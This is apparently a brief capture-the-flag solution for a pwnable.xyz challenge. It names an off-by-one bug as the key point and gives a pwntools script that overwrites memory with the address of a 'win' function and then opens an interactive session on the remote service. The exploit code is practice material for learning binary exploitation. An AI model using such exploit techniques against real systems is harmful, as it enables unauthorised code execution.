### 知识点

- off by 1



### 脚本

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

e = ELF('./challenge')
win_addr = e.symbols['win']

p = remote('svc.pwnable.xyz', 30035)
# p = process('./challenge')

p.sendafter(b': ', b'a' * 0x80)
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'size: ', b'256')
p.sendafter(b'Title: ', (p64(win_addr) * 4)[:-1])
p.sendafter(b'Note: ', p64(win_addr) * (256 // 8))

p.sendlineafter(b'> ', b'4')
p.sendafter(b': ', p8(0xf8) * 0x80)

# gdb.attach(p)
p.sendlineafter(b'> ', b'2')
p.interactive()

```

